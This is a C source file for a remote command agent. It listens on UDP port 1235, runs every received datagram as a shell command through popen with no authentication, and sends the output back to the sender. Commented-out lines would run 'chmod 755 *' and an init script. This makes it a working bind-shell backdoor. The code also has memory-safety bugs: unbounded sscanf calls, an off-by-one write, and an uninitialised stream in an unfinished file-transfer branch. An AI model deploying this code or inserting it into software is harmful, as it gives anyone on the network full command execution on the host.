#include <stdio.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define PORT 1235
#define LENGTH  512

int main(int argc, char **argv) {
    int x, z, sockfd;

    char datagram[LENGTH], command[16], path[128];
    int length = LENGTH;

    struct sockaddr_in control_add;
    struct sockaddr_in remote_add;
    FILE *fp;  // it will open a stream for the output of command

    // Initialize the host machine
    // popen("chmod 755 *", "r");
    // popen("./init.sh", "r");

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    bzero(&remote_add, sizeof(remote_add));
    remote_add.sin_family = AF_INET;
    remote_add.sin_port = htons(PORT);
    remote_add.sin_addr.s_addr = htonl(INADDR_ANY);

    z = bind(sockfd, (struct sockaddr *)&remote_add, sizeof(remote_add));
    if (z == -1)
        printf("ERR_bind: %s\n", strerror(errno));

    while(1) {
        puts("Waiting for command...");
        bzero(datagram, 512);

        // Here we are waiting for receiving command from remote machine
        z = recvfrom(sockfd, datagram, 512, 0, (struct sockaddr *)&control_add, &length);
        if (z == -1)
            printf("ERR_recvfrom: %s\n", strerror(errno));

        datagram[z] = 0;
        printf("Command:%s", datagram);

        sscanf(datagram, "%[^ ]", command);
        // use function chdir() to replacement command 'cd'
        if (strcmp(command, "cd") == 0) {
            bzero(command, sizeof(command));
            sscanf(datagram, "%*3s%s", path);
            if (chdir(path) == -1) {
                printf("Chdir: %s\n", strerror(errno));
            }else {
                fp = popen("pwd", "r");
            }
            bzero(path, sizeof(path));
        }
        // transfer file to the remote machine
        else if (strcmp(command, "tran") == 0) {
            bzero(command, sizeof(command));
            // ...
        }else
            fp = popen(datagram, "r");  // opening a stream by executing the command
        bzero(datagram, sizeof(datagram));


        // collecting the output and sending to the remote
        while(fgets(datagram, sizeof(datagram)-1, fp) != NULL) {
            x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
            if (x == -1)
                printf("ERR_sendto: %s\n", strerror(errno));

            bzero(datagram, sizeof(datagram));
        }
        // marking the end of output of command
        strcpy(datagram, "___EOF___\n");
        x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
        if (x == -1)
            printf("ERR_sendto:%s\n", strerror(errno));
    }
    close(sockfd);
    return 0;
}